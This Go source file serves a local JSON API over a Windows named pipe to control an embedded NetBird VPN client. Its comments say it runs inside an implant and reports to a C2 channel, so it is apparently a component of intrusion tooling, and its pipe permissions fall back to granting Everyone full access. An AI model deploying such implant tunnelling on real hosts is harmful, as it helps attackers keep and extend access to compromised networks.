package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/Microsoft/go-winio"
	"github.com/netbirdio/netbird/client/embed"
	"golang.org/x/sys/windows"
)

// LocalAPIServer serves an HTTP/1.0 JSON API on a Windows named pipe.
type LocalAPIServer struct {
	client   *embed.Client
	pipePath string
	listener net.Listener
	mu       sync.Mutex
	closed   bool
}

// NewLocalAPIServer creates a new LocalAPI server instance.
func NewLocalAPIServer(client *embed.Client, pipePath string) *LocalAPIServer {
	return &LocalAPIServer{
		client:   client,
		pipePath: pipePath,
	}
}

// pipeSecurityDescriptor grants full access to the current user, SYSTEM and
// Administrators.
//
// go-winio applies a restrictive default descriptor (Administrators and SYSTEM
// only). A process that is neither, which is the normal case when the daemon
// runs inside an implant, is denied access to the pipe it created itself and
// every Accept fails with "Access is denied". Naming the current user
// explicitly keeps the pipe closed to other standard users while remaining
// usable without elevation.
func pipeSecurityDescriptor() string {
	// Everyone is the fallback: it always works and the pipe name is a
	// random UUID with a short lifetime.
	const fallback = "D:P(A;;GA;;;SY)(A;;GA;;;BA)(A;;GA;;;WD)"

	token := windows.GetCurrentProcessToken()
	user, err := token.GetTokenUser()
	if err != nil || user == nil || user.User.Sid == nil {
		return fallback
	}
	return fmt.Sprintf("D:P(A;;GA;;;SY)(A;;GA;;;BA)(A;;GA;;;%s)", user.User.Sid.String())
}

// Serve starts listening on the named pipe and handles HTTP/1.0 requests.
func (s *LocalAPIServer) Serve(ctx context.Context) error {
	cfg := &winio.PipeConfig{
		SecurityDescriptor: pipeSecurityDescriptor(),
		InputBufferSize:    64 * 1024,
		OutputBufferSize:   64 * 1024,
	}

	listener, err := winio.ListenPipe(s.pipePath, cfg)
	if err != nil {
		return fmt.Errorf("listen pipe %s: %w", s.pipePath, err)
	}

	s.mu.Lock()
	s.listener = listener
	s.mu.Unlock()

	log.Printf("[+] LocalAPI listening on %s\n", s.pipePath)

	const (
		minBackoff = 50 * time.Millisecond
		maxBackoff = 2 * time.Second
	)
	backoff := minBackoff
	failures := 0

	for {
		conn, err := listener.Accept()
		if err != nil {
			s.mu.Lock()
			closed := s.closed
			s.mu.Unlock()
			if closed {
				return nil
			}

			// A persistent Accept failure would otherwise spin the CPU and
			// flood the C2 output channel with an unbounded log stream.
			// Back off and report only the first failure and every 50th
			// thereafter.
			failures++
			if failures == 1 || failures%50 == 0 {
				log.Printf("[!] Accept error (%d consecutive): %v\n", failures, err)
			}
			select {
			case <-ctx.Done():
				return nil
			case <-time.After(backoff):
			}
			if backoff < maxBackoff {
				backoff *= 2
				if backoff > maxBackoff {
					backoff = maxBackoff
				}
			}
			continue
		}

		failures = 0
		backoff = minBackoff
		go s.handleConnection(ctx, conn)
	}
}

// Close shuts down the listener.
func (s *LocalAPIServer) Close() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.closed = true
	if s.listener != nil {
		s.listener.Close()
	}
}

// handleConnection reads an HTTP/1.0 request from the pipe and dispatches it.
func (s *LocalAPIServer) handleConnection(ctx context.Context, conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)
	req, err := http.ReadRequest(reader)
	if err != nil {
		if err != io.EOF {
			log.Printf("[!] Read request error: %v\n", err)
		}
		return
	}
	defer req.Body.Close()

	var statusCode int
	var responseBody interface{}

	path := strings.TrimPrefix(req.URL.Path, "/localapi/v0/")

	switch {
	case req.Method == "GET" && path == "status":
		statusCode, responseBody = s.handleStatus()

	case req.Method == "POST" && path == "up":
		statusCode, responseBody = s.handleUp(ctx)

	case req.Method == "POST" && path == "down":
		statusCode, responseBody = s.handleDown(ctx)

	case req.Method == "POST" && path == "shutdown":
		statusCode, responseBody = s.handleShutdown(ctx)

	case req.Method == "GET" && path == "config":
		statusCode, responseBody = s.handleConfig()

	default:
		statusCode = http.StatusNotFound
		responseBody = map[string]string{"error": "not found"}
	}

	s.writeResponse(conn, statusCode, responseBody)
}

func (s *LocalAPIServer) handleStatus() (int, interface{}) {
	status, err := s.client.Status()
	if err != nil {
		return http.StatusInternalServerError, map[string]string{"error": err.Error()}
	}
	return http.StatusOK, status
}

func (s *LocalAPIServer) handleUp(ctx context.Context) (int, interface{}) {
	// Client is already started at daemon startup; this is a no-op or restart
	err := s.client.Start(ctx)
	if err != nil {
		// ErrClientAlreadyStarted is expected
		if err.Error() == "client already started" {
			return http.StatusOK, map[string]string{"status": "already running"}
		}
		return http.StatusInternalServerError, map[string]string{"error": err.Error()}
	}
	return http.StatusOK, map[string]string{"status": "started"}
}

func (s *LocalAPIServer) handleDown(ctx context.Context) (int, interface{}) {
	err := s.client.Stop(ctx)
	if err != nil {
		return http.StatusInternalServerError, map[string]string{"error": err.Error()}
	}
	return http.StatusOK, map[string]string{"status": "stopped"}
}

func (s *LocalAPIServer) handleShutdown(ctx context.Context) (int, interface{}) {
	// Stop the client, then signal the main goroutine to exit
	_ = s.client.Stop(ctx)

	// Signal main to exit by closing the listener
	go s.Close()

	return http.StatusOK, map[string]string{"status": "shutting down"}
}

func (s *LocalAPIServer) handleConfig() (int, interface{}) {
	config, err := s.client.GetConfig()
	if err != nil {
		return http.StatusInternalServerError, map[string]string{"error": err.Error()}
	}
	return http.StatusOK, config
}

func (s *LocalAPIServer) writeResponse(conn net.Conn, statusCode int, body interface{}) {
	var bodyBytes []byte
	var err error

	if body != nil {
		bodyBytes, err = json.Marshal(body)
		if err != nil {
			statusCode = http.StatusInternalServerError
			bodyBytes = []byte(`{"error":"json marshal failed"}`)
		}
	}

	statusText := http.StatusText(statusCode)
	if statusText == "" {
		statusText = "Unknown"
	}

	// Write HTTP/1.0 response
	header := fmt.Sprintf("HTTP/1.0 %d %s\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n",
		statusCode, statusText, len(bodyBytes))

	conn.Write([]byte(header))
	if len(bodyBytes) > 0 {
		conn.Write(bodyBytes)
	}
}
